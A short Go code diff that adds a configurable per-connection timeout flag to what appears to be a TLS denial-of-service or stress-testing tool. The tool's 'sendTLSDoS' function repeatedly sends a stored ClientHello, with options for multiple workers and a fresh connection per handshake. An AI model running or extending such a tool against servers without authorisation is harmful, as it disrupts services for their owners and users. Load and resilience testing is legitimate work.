@@ -19,16 +19,20 @@ var errors uint64
 var options struct {
 	verbose, reopen bool
 	workers         int
+	timeout         int64
 }
 
 func init() {
 	flag.BoolVar(&options.verbose, "v", false, "Verbose output")
 	flag.BoolVar(&options.reopen, "reopen", false, "Open a new connection for every ClientHello")
 	flag.IntVar(&options.workers, "workers", 1, "Number of worker go routines")
+	flag.Int64Var(&options.timeout, "timeout", 0, "The send/recv timeout for each connection in ms")
 }
 
 func sendTLSDoS(c *net.TCPConn) (bool, error) {
-	c.SetDeadline(time.Now().Add(3 * time.Second))
+	if options.timeout != 0 {
+		c.SetDeadline(time.Now().Add(time.Duration(options.timeout) * time.Millisecond))
+	}
 	i := 0
 	for i < len(clientHello) {
 		n, err := c.Write(clientHello[i:])
